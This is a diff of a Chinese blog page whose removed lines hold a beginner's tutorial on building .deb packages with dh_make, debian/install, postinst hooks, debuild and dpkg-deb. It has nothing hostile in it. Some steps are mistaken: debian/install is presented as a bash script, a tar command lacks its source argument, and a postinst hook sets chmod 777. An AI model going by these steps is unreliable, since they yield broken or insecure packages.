clean就是执行了下面三个指令</span></span><br><span class="line">$ dh clean</span><br><span class="line">output:</span><br><span class="line">   dh_testdir</span><br><span class="line">   dh_auto_clean</span><br><span class="line">   dh_clean</span><br></pre></td></tr></table></figure>
-
-<p><strong><em>2.4、debian/install + debian/postinst的使用</em></strong><br>&emsp;&emsp;还有一个文件对于非源码打包作用很大，即debian/install。如果你的软件包需要那些标准的make install没有安装的文件，你可以把文件名和目标路径写入 debian/install文件，它们将被 dh_install安装:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设有个空文件的tar.gz包，文件结构如下</span></span><br><span class="line">$ tree <span class="built_in">test</span>-1.0</span><br><span class="line"><span class="built_in">test</span>-1.0/</span><br><span class="line">├── debian</span><br><span class="line">│   └── install</span><br><span class="line">└── 1.md</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;install的初始位置就是在打包根目录下，install文件可以这样写:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">cp 1.md /home</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;如果想在安装成功后修改文件的权限，则需要修改postinst文件，可以这样写:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">chmod 777 /home/1.md</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;目前还有一个遗留问题，就是打包前给的777权限，安装后权限变成了755。</p>
-<p><strong><em>2.5、deb打包钩子脚本执行流程</em></strong>  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首次安装某deb包时，执行dpkg -i test_v1.deb安装，DEBIAN下面控制脚本按如下顺序执行：</span></span><br><span class="line">preinst-&gt;postinst</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若卸载deb，但保留配置档，执行dpkg -r test，DEBIAN下面控制脚本按如下顺序执行：</span></span><br><span class="line">prerm-&gt;postrm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若卸载不保留配置档，执行dpkg -P test，DEBIAN下面控制脚本按如下顺序执行：</span></span><br><span class="line">prerm-&gt;postrm-&gt;postrm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若升级安装,例如执行dpkg -i test_v2.deb，DEBIAN下面的控制脚本执行顺序如下：</span></span><br><span class="line">prerm-&gt;preinst-&gt;postrm-&gt;postinst</span><br></pre></td></tr></table></figure>
-
-<p><strong><em>3.1、源码打包方法 - debuild / dpkg-buildpackage</em></strong><br>&emsp;&emsp;deb源码打包一个优点是能够识别CMake文件，并自动编译。现以一个实例程序展示源码打包的流程:  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源码结构</span></span><br><span class="line"><span class="comment"># 注意源码根文件夹名不能有大写</span></span><br><span class="line"><span class="comment"># 根文件名一般取 项目名称 + &#x27;-&#x27; + 版本号，例如ctest-1.0</span></span><br><span class="line">$ tree debbuild</span><br><span class="line">debbuild/</span><br><span class="line">└── ctest-1.0</span><br><span class="line">    ├── CMakeLists.txt</span><br><span class="line">    └── CTest.cpp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成tar.gz包</span></span><br><span class="line">$ tar -zcvf debbuild/ctest-1.0.tar.gz</span><br><span class="line">$ tree debbuild</span><br><span class="line">debbuild/</span><br><span class="line">├── ctest-1.0</span><br><span class="line">│   ├── CMakeLists.txt</span><br><span class="line">│   └── CTest.cpp</span><br><span class="line">└── ctest-1.0.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用dh_make自动生成debian包，选择&#x27;single&#x27; &#x27;Y&#x27;</span></span><br><span class="line">$ <span class="built_in">cd</span> ctest-1.0</span><br><span class="line">$ dh_make -f ../ctest-1.0.tar.gz</span><br><span class="line">$ tree debbuild</span><br><span class="line">debbuild/</span><br><span class="line">├── ctest-1.0</span><br><span class="line">│   ├── CMakeLists.txt</span><br><span class="line">│   ├── CTest.cpp</span><br><span class="line">│   └── debian</span><br><span class="line">└── ctest-1.0.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后使用debuild / dpkg-buildpackage去生成deb包</span></span><br><span class="line">$ <span class="built_in">cd</span> ctest-1.0</span><br><span class="line">$ debuild -us -uc -b</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ dpkg-buildpackage -us -uc -b</span><br><span class="line">$ tree debbuild</span><br><span class="line">debbuild/</span><br><span class="line">├── ctest-1.0</span><br><span class="line">│   ├── CMakeLists.txt</span><br><span class="line">│   ├── CTest.cpp</span><br><span class="line">│   ├── debian</span><br><span class="line">│   └── obj-x86_64-linux-gnu</span><br><span class="line">├── ctest_1.0-1_amd64.deb</span><br><span class="line">└── ctest-1.0.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 末了，可以使用dh clean清理生成的多余文件</span></span><br><span class="line">$ dh clean</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;值得注意的是，目前仍不知道如何使用rules文件，因此源码打包流程中所有的make install过程均在CMakeList.txt实现(实际上也应该这么实现)。</p>
-<p><strong><em>4.1、非源码打包方法 - debuild / dpkg-buildpackage</em></strong><br>&emsp;&emsp;非源码打包需要使用debian/install与debian/rules文件的作用。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打一个空tar包</span></span><br><span class="line"><span class="comment"># 并在打包根目录下新建一个1.md的文档</span></span><br><span class="line">$ tree debbuild</span><br><span class="line">debbuild/</span><br><span class="line">├── ctest-1.0</span><br><span class="line">│   ├── 1.md</span><br><span class="line">│   └── debian</span><br><span class="line">└── ctest-1.0.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加debian/install文件，内容如下</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">cp 1.md /home</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后使用dpkg-buildpackage去生成deb包</span></span><br><span class="line"><span class="comment"># 观察debian的目录结构，发现有一个ctest文件夹，该目录就是创建的假根目录</span></span><br><span class="line"><span class="comment"># 而1.md文件已经被放了进去</span></span><br><span class="line">$ tree debian</span><br><span class="line">debian/</span><br><span class="line">└── ctest</span><br><span class="line">    ├── DEBIAN</span><br><span class="line">    │   ├── control</span><br><span class="line">    │   └── md5sums</span><br><span class="line">    ├── home</span><br><span class="line">    │   └── 1.md</span><br><span class="line">    └── usr</span><br><span class="line">        └── share</span><br><span class="line">            └── doc</span><br><span class="line">                └── ctest</span><br><span class="line">                    ├── changelog.Debian.gz</span><br><span class="line">                    ├── copyright</span><br><span class="line">                    └── README.Debian</span><br><span class="line"><span class="comment"># 另外也可以观察生成的deb包，文件确实已经打进deb包</span></span><br><span class="line">$ dpkg -c ctest_1.0-1_amd64.deb</span><br><span class="line">output:</span><br><span class="line">drwxr-xr-x root/root         0 2021-06-25 17:17 ./home/</span><br><span class="line">-rwxr-xr-x root/root         0 2021-06-25 17:03 ./home/1.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后使用debuild / dpkg-buildpackage去生成deb包</span></span><br><span class="line">$ <span class="built_in">cd</span> ctest-1.0</span><br><span class="line">$ debuild -us -uc -b</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ dpkg-buildpackage -us -uc -b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 末了，可以使用dh clean清理生成的多余文件</span></span><br><span class="line">$ dh clean</span><br></pre></td></tr></table></figure>
-
-<p><strong><em>4.2、非源码打包方法 - dpkg-deb</em></strong><br>&emsp;&emsp;该方法只适用于非源码打包，但是优点是不需要写make install，因为它的DEBIAN文件同级目录下的其他目录结构就代表了需要install的路径:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先搭建一个打包目录</span></span><br><span class="line"><span class="comment"># 注意DEBIAN文件夹必须大写，且DEBIAN/control文件与自动生成的格式不同</span></span><br><span class="line">$ tree dpkgdeb</span><br><span class="line">dpkgdeb/</span><br><span class="line">├── CTest                   <span class="comment"># 源码包</span></span><br><span class="line">│   ├── CMakeLists.txt</span><br><span class="line">│   ├── CTest.cpp</span><br><span class="line">│   └── build               <span class="comment"># 手动编译结果存放文件夹</span></span><br><span class="line">└── ctest-1.0</span><br><span class="line">    ├── DEBIAN              <span class="comment"># 手动生成的DEBIAN文件</span></span><br><span class="line">    │   ├── changelog</span><br><span class="line">    │   ├── compat</span><br><span class="line">    │   ├── control</span><br><span class="line">    │   └── rules</span><br><span class="line">    └── usr                 <span class="comment"># DEBIAN同级目录下的其他文件夹，即最终安装位置</span></span><br><span class="line">        └── bin</span><br><span class="line">            └── CTest       <span class="comment"># 编译出来的可执行程序，从CTest/build文件夹下拷贝</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DEBIAN/control文件格式</span></span><br><span class="line">$ cat DEBIAN/control</span><br><span class="line">Package: ctest</span><br><span class="line">Version: 1.0</span><br><span class="line">Architecture: any</span><br><span class="line">Maintainer: xuyanghe &lt;yhxu94@126.com&gt;</span><br><span class="line">Section: devel</span><br><span class="line">Priority: optional</span><br><span class="line">Homepage: https://jailbreakfox.github.io</span><br><span class="line">Description: deb package make tutorial</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在打包根目录的父目录执行dpkg-deb</span></span><br><span class="line">$ <span class="built_in">cd</span> dpkgdeb</span><br><span class="line">$ fakeroot dpkg-deb -b ctest-1.0 ctest-1.0.deb</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-引用文献"><a href="#0x03-引用文献" class="headerlink" title="0x03 引用文献"></a><em>0x03 引用文献</em></h3><p>[1]<a target="_blank" rel="noopener" href="https://github.com/JailbreakFox/Linux-sh-package/blob/master/Centos/Centos%20Mini.md">https://github.com/JailbreakFox/Linux-sh-package/blob/master/Centos/Centos%20Mini.md</a><br>[2]<a target="_blank" rel="noopener" href="https://blog.csdn.net/get_set/article/details/53453320">https://blog.csdn.net/get_set/article/details/53453320</a><br>[3]<a target="_blank" rel="noopener" href="https://www.cnblogs.com/SQL888/p/5776442.html">https://www.cnblogs.com/SQL888/p/5776442.html</a><br>[4]<a target="_blank" rel="noopener" href="https://www.debian.org/doc/manuals/maint-guide/index.zh-cn.html">https://www.debian.org/doc/manuals/maint-guide/index.zh-cn.html</a></p>
-</div></div>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机技术，打包工具</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/06/24/deb%E4%B8%8Erpm%E6%89%93%E5%8C%85/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/3/">下一页</a>
@@ -781,15 +638,11 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">计算机技术</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">计算机基础</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Linux 工具</a>
+                <a href="javascript:void(0)" class="js-tag color1">计算机技术</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -797,11 +650,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">工具</a>
+                <a href="javascript:void(0)" class="js-tag color4">Linux 工具</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">计算机技术 Linux</a>
+                <a href="javascript:void(0)" class="js-tag color3">工具</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -809,11 +662,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+                <a href="javascript:void(0)" class="js-tag color2">计算机技术 Linux</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">计算机技术，Linux内核</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -841,6 +698,10 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">食物 茶</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">信息安全技术</a>
               </li>
              
@@ -850,10 +711,6 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">游戏设计，游戏AI，入门</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">食物 茶</a>
               </li>
              
               <li class="article-tag-list-item">
